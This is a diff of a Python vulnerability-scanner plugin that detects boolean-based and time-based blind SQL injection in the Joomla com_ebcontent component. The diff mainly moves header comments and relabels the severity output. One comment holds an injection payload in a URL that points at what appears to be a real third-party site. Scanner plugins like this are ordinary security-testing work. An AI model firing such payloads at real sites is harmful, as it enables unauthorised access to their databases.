@@ -1,9 +1,11 @@
+# !/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+# refer:https://www.bugscan.net/#!/x/22902
+# http://acquydongnai.net/index.php?option=com_ebcontent&view=article&tmpl=component&id=265%27%20AND%207599=7599%20AND%20%27gefD%27=%27gefD&cid=20&print=1&Itemid=14&lang=vn
+
 from ..miniCurl import Curl
 from ..t  import T
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-#refer:https://www.bugscan.net/#!/x/22902
-#http://acquydongnai.net/index.php?option=com_ebcontent&view=article&tmpl=component&id=265%27%20AND%207599=7599%20AND%20%27gefD%27=%27gefD&cid=20&print=1&Itemid=14&lang=vn
 import time
 
 class P(T):
@@ -34,9 +36,9 @@ class P(T):
         seconde_end_time = time.time()
         T2=seconde_end_time-seconde_start_time
         if code0 == code1 == 200 and len(body0)==len(body1)!=len(body2):
-            output('Joomla com_ebcontent SQL injection boolean-based blind'+url1,result,'hole')
+            output('Joomla com_ebcontent SQL injection boolean-based blind'+url1,result,'高危(HOLE)')
         elif 4.5<T2-T1:
-            output('Joomla com_ebcontent SQL injection Time-based blind'+url3,result,'hole')
+            output('Joomla com_ebcontent SQL injection Time-based blind'+url3,result,'高危(HOLE)')
                         
 
         del curl
